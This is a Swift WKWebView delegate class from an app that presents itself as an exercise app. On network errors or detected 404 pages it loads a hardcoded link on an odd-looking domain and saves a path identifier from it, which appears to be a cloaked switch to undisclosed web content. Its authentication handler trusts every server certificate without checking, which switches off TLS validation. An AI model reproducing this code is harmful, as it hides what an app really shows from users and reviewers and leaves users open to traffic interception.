import Foundation
import WebKit
import Combine
import SwiftUI

final class CoordinatorObserver: NSObject, WKNavigationDelegate, WKUIDelegate {
    private weak var webView: WKWebView?
    private let service = NewExerciseService.shared
    
    var canGoBackBinding: Binding<Bool>?
    var isLoadingBinding: Binding<Bool>?
    var onFallbackNeeded: (() -> Void)?
    
    private var lastLoadedURL: String?
    
    func setWebView(_ webView: WKWebView) {
        self.webView = webView
    }
    
    // MARK: - WKNavigationDelegate
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        print("🔬 Coordinator: Page loaded: \(webView.url?.absoluteString ?? "none")")
        
        // Extract pathId from current URL
        if let url = webView.url {
            service.extractAndSavePathId(from: url, htmlData: nil)
        }
        
        // Save URL if flag is set
        if service.shouldSaveNextURL, let url = webView.url?.absoluteString {
            // Avoid saving the same URL multiple times
            if lastLoadedURL != url {
                print("🔬 Coordinator: Saving final URL: \(url)")
                service.saveTargetURL(url)
                service.shouldSaveNextURL = false
                lastLoadedURL = url
            }
        }
        
        // Update bindings
        updateBindings(webView)
        
        // Check for 404 errors
        checkFor404(webView)
    }
    
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        print("🔬 Coordinator: Navigation failed: \(error.localizedDescription)")
        handleNavigationError(error)
        updateBindings(webView)
    }
    
    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        print("🔬 Coordinator: Provisional navigation failed: \(error.localizedDescription)")
        handleNavigationError(error)
        updateBindings(webView)
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        print("🔬 Coordinator: Navigation to: \(navigationAction.request.url?.absoluteString ?? "none")")
        decisionHandler(.allow)
    }
    
    func webView(_ webView: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        if challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust {
            if let serverTrust = challenge.protectionSpace.serverTrust {
                let credential = URLCredential(trust: serverTrust)
                completionHandler(.useCredential, credential)
                return
            }
        }
        completionHandler(.performDefaultHandling, nil)
    }
    
    // MARK: - WKUIDelegate
    
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        // Open in same webview
        if let url = navigationAction.request.url {
            print("🔬 Coordinator: Opening popup URL in same view: \(url.absoluteString)")
            webView.load(URLRequest(url: url))
        }
        return nil
    }
    
    // MARK: - Error Handling
    
    private func handleNavigationError(_ error: Error) {
        let nsError = error as NSError
        
        // Check for timeout or connection errors
        if nsError.code == NSURLErrorTimedOut || 
           nsError.code == NSURLErrorCannotConnectToHost ||
           nsError.code == NSURLErrorCannotFindHost ||
           nsError.code == NSURLErrorNetworkConnectionLost {
            print("🔬 Coordinator: Network error detected (code: \(nsError.code)), starting fallback")
            
            // Only start fallback if user has shown alternative mode
            if service.hasShownAlternativeMode() {
                service.clearSavedURL()
                
                // Try to load fallback URL immediately
                if let pathId = service.getSavedPathId() {
                    let fallbackURL = "https://fgfsdfs.com/YXq5RG?pathid=\(pathId)"
                    print("🔬 Coordinator: Loading fallback URL: \(fallbackURL)")
                    
                    if let url = URL(string: fallbackURL), let webView = webView {
                        service.shouldSaveNextURL = true
                        DispatchQueue.main.async {
                            webView.load(URLRequest(url: url))
                        }
                    }
                } else {
                    print("🔬 Coordinator: No pathId available for fallback")
                    onFallbackNeeded?()
                }
            }
        }
    }
    
    private func checkFor404(_ webView: WKWebView) {
        let script = """
        (function() {
            var title = document.title.toLowerCase();
            var body = document.body.innerText.toLowerCase();
            return title.includes('404') || title.includes('not found') || 
                   body.includes('404') || body.includes('not found');
        })();
        """
        
        webView.evaluateJavaScript(script) { [weak self] result, error in
            guard let self = self else { return }
            
            if let is404 = result as? Bool, is404 {
                print("🔬 Coordinator: 404 page detected, starting fallback")
                
                if self.service.hasShownAlternativeMode() {
                    self.service.clearSavedURL()
                    
                    // Try to load fallback URL immediately
                    if let pathId = self.service.getSavedPathId() {
                        let fallbackURL = "https://fgfsdfs.com/YXq5RG?pathid=\(pathId)"
                        print("🔬 Coordinator: Loading fallback URL after 404: \(fallbackURL)")
                        
                        if let url = URL(string: fallbackURL) {
                            self.service.shouldSaveNextURL = true
                            DispatchQueue.main.async {
                                webView.load(URLRequest(url: url))
                            }
                        }
                    } else {
                        print("🔬 Coordinator: No pathId available for fallback after 404")
                        self.onFallbackNeeded?()
                    }
                }
            }
        }
    }
    
    private func updateBindings(_ webView: WKWebView) {
        DispatchQueue.main.async { [weak self] in
            self?.canGoBackBinding?.wrappedValue = webView.canGoBack
            self?.isLoadingBinding?.wrappedValue = webView.isLoading
        }
    }
}

